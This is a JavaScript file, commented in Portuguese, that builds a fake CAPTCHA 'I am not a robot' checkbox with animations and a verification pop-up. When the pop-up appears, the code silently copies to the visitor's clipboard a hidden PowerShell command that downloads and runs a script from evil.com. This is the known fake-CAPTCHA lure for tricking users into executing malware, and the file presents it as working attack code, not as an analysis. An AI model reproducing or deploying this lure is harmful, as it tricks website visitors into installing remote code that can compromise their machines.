// Referências DOM
let checkboxWindow = document.getElementById("fkrc-checkbox-window");
let checkboxBtn = document.getElementById("fkrc-checkbox");
let checkboxBtnSpinner = document.getElementById("fkrc-spinner");
let verifyWindow = document.getElementById("fkrc-verifywin-window");
let verifyWindowArrow = document.getElementById("fkrc-verifywin-window-arrow");

// Listener
function addCaptchaListeners() {
  if (checkboxBtn) {
    checkboxBtn.addEventListener("click", function (event) {
      event.preventDefault();
      checkboxBtn.disabled = true;
      runClickedCheckboxEffects();
    });
  }
}
addCaptchaListeners();

// Efeitos ao clicar no checkbox
function runClickedCheckboxEffects() {
  hideCaptchaCheckbox();
  setTimeout(() => {
    showCaptchaLoading();
  }, 400);
  setTimeout(() => {
    showVerifyWindow();
  }, 1000);
}

// Animações
function hideCaptchaCheckbox() {
  checkboxBtn.style.width = "4px";
  checkboxBtn.style.height = "4px";
  checkboxBtn.style.borderRadius = "50%";
  checkboxBtn.style.marginLeft = "25px";
  checkboxBtn.style.marginTop = "33px";
  checkboxBtn.style.opacity = "0";
}

function showCaptchaCheckbox() {
  checkboxBtn.style.width = "100%";
  checkboxBtn.style.height = "100%";
  checkboxBtn.style.borderRadius = "2px";
  checkboxBtn.style.margin = "21px 0 0 12px";
  checkboxBtn.style.opacity = "1";
}

function showCaptchaLoading() {
  checkboxBtnSpinner.style.visibility = "visible";
  checkboxBtnSpinner.style.opacity = "1";
}

function hideCaptchaLoading() {
  checkboxBtnSpinner.style.visibility = "hidden";
  checkboxBtnSpinner.style.opacity = "0";
}

// Exibe o painel de verificação
function showVerifyWindow() {
  verifyWindow.style.display = "block";
  verifyWindow.style.visibility = "visible";
  verifyWindow.style.opacity = "1";

  verifyWindow.style.top = checkboxWindow.offsetTop - 80 + "px";
  verifyWindow.style.left = checkboxWindow.offsetLeft + 54 + "px";

  if (verifyWindow.offsetTop < 5) {
    verifyWindow.style.top = "5px";
  }

  if (verifyWindow.offsetLeft + verifyWindow.offsetWidth > window.innerWidth - 10) {
    verifyWindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
  } else {
    verifyWindowArrow.style.top = checkboxWindow.offsetTop + 24 + "px";
    verifyWindowArrow.style.left = checkboxWindow.offsetLeft + 45 + "px";
    verifyWindowArrow.style.visibility = "visible";
    verifyWindowArrow.style.opacity = "1";
  }

  // ✅ Copiar automaticamente o payload
  const payload = `powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://evil.com/script.ps1')"`;
  const textarea = document.createElement("textarea");
  textarea.value = payload;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand("copy");
  document.body.removeChild(textarea);
}

// Reset (caso precise)
function closeVerifyWindow() {
  verifyWindow.style.display = "none";
  verifyWindow.style.visibility = "hidden";
  verifyWindow.style.opacity = "0";

  verifyWindowArrow.style.visibility = "hidden";
  verifyWindowArrow.style.opacity = "0";

  showCaptchaCheckbox();
  hideCaptchaLoading();
  checkboxBtn.disabled = false;
}
